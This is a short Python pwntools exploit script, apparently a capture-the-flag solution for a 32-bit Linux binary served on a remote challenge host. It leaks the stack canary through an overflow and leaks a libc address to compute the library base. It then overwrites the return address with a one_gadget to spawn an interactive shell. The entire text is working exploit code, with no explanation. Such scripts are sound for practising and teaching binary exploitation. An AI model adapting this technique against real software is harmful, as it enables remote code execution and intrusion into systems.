
from pwn import *

context(arch = 'i386', os = 'linux')

# r = process('./foo_3')
r = remote('bamboofox.cs.nctu.edu.tw',10103)
lib = ELF('./libc6-i386_2.19-0ubuntu6.15_amd64.so', checksec=False)
# lib = ELF('/lib/i386-linux-gnu/libc.so.6')

lib_stdin = lib.sym['_IO_2_1_stdin_']

main = 0x080485D0
r.sendline(b'A'* 12)
r.readline()
canary = b'\x00' + r.readline()[:-1]

log.info('Canary: '+hex(u32(canary)))

r.sendline(p32(u32(canary)) * 7 + p32(main))

r.sendline(b'B' * 43) 
r.sendline(p32(u32(canary)) * 7 + p32(main))
r.readline()

leak = r.readline()[:4]
lib_base = u32(leak) - lib_stdin
one_gadget = 0x3fd27

log.info('Libc: '+hex(lib_base))
r.sendline(b'A'*12)
r.sendline(p32(u32(canary)) * 7 + p32(lib_base+one_gadget))

r.interactive()